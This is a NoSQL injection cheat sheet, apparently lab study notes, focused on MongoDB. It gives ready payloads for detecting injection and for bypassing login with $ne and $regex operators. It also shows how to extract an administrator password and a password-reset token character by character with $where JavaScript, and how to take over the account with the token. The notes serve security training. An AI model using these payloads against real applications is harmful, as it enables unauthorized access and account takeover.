
---

# 🧩 NoSQL Injection Cheat Sheet (MongoDB Focus)

## Table of Contents

- [[#1 Detecting NoSQL Injection]]
    
- [[#2 Authentication Bypass (MongoDB Operator Injection)]]
    
- [[#3 Extracting Data (Boolean-Based & Enumeration)]]
    
- [[#4 Extracting Unknown Fields ($where Enumeration)]]
    

---

# 1️⃣ Detecting NoSQL Injection

### **Goal:** Determine if user input is injected into a MongoDB query.

### **Tests**

#### **1. Error-Based Check**

Payload:

```
'
```

If you get a JS syntax error → possible NoSQL injection.

#### **2. JS Injection Test**

Payload:

```
Gifts'+'
```

URL-encode before sending.

👉 If response is normal → input is concatenated into a JS query.

#### **3. Boolean Condition Tests**

**False condition → no results**

```
Gifts' && 0 && 'x
```

**True condition → normal results**

```
Gifts' && 1 && 'x
```

#### **4. Always-True Payload**

```
Gifts'||1||'
```

### **Usage Example**

Query might look like:

```js
db.products.find({category: "Gifts'||1||'"})
```

The `||1||` makes the query always true → reveals hidden/unreleased products.

---

# 2️⃣ Authentication Bypass (MongoDB Operators)

Goal: Abuse `POST /login` parameters by injecting MongoDB operators.

### **1. Bypass username check**

Payload:

```json
{"$ne":""}
```

Effect: Matches any username ≠ "" → returns _first user_ in DB.

### **2. Regex match**

Payload:

```json
{"$regex":"wien.*"}
```

Effect: Login as any user whose username starts with "wien".

### **3. Bypass both username and password**

Username:

```json
{"$regex":"admin.*"}
```

Password:

```json
{"$ne":""}
```

Logs you in as _admin_ because:

- username matches admin
    
- password matches any non-empty value
    

### **Example Query**

Backend likely runs:

```js
db.users.find({username: {"$regex":"admin.*"}, password: {"$ne":""}})
```

---

# 3️⃣ Extracting Data (Boolean-Based NoSQL Injection)

Target: `/user/lookup?user=wiener`

## Step 1: Verify injection with JS concatenation

Payload:

```
wiener'+'
```

## Step 2: Boolean test

**False condition**

```
wiener' && '1'=='2
```

**True condition**

```
wiener' && '1'=='1
```

If true returns user details → injection confirmed.

---

## 🔍 Extracting Password Length

Payload template:

```
administrator' && this.password.length < N || 'a'=='b
```

Reduce `N` until false.  
If:

- `<9` → true
    
- `<8` → false
    

Password length = **8**.

---

## 🔢 Extract Password Character-by-Character (Intruder)

Payload:

```
administrator' && this.password[§0§]=='§a§
```

- Position → 0–7
    
- Characters → a–z
    

When true → response contains user details → save the matched char.

---

# 4️⃣ Extracting Unknown Fields ($where Enumeration)

Target: `POST /login`

## Step 1: Test `$ne` operator

```
"password": {"$ne": "invalid"}
```

If response changes → operator works.

## Step 2: Test `$where` JS execution

Payload:

```
"$where": "1"
```

If result changes → JS is evaluated → **vulnerable**.

---

## 🔍 Enumerate Field Names

Goal: Identify all object keys inside `this`.

Payload template:

```
"$where":"Object.keys(this)[1].match('^.{}.*')"
```

For enumeration with Intruder:

```
"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
```

- Payload 1 → position: 0–20
    
- Payload 2 → characters: a–z, A–Z, 0–9
    

When TRUE → response is **Account locked**.  
Recovered characters spell the key name (e.g. `username`, `resetToken`).

---

## 🔐 Extract Reset Token Value

Once the token key name = `resetToken`:

Payload:

```
"$where":"this.resetToken.match('^.{§§}§§.*')"
```

Enumerate until entire token value is recovered.

---

## Reset Password

Send:

```
GET /forgot-password?resetToken=THEVALUE
```

Then change password → log in.

---

# ✅ Quick Payload Reference

### **Detection**

```
'
Gifts'+'
Gifts' && 0 && 'x
Gifts'||1||'
```

### **Auth Bypass**

```
{"username":{"$ne":""}}
{"username":{"$regex":"admin.*"}}
{"password":{"$ne":""}}
```

### **Boolean Extraction**

```
user' && '1'=='2
administrator' && this.password.length < N
administrator' && this.password[i] == 'x'
```

### **Unknown Field Enumeration**

```
"$where":"Object.keys(this)[i].match('^.{pos}char.*')"
"$where":"this.FIELD.match('^.{pos}char.*')"
```

---

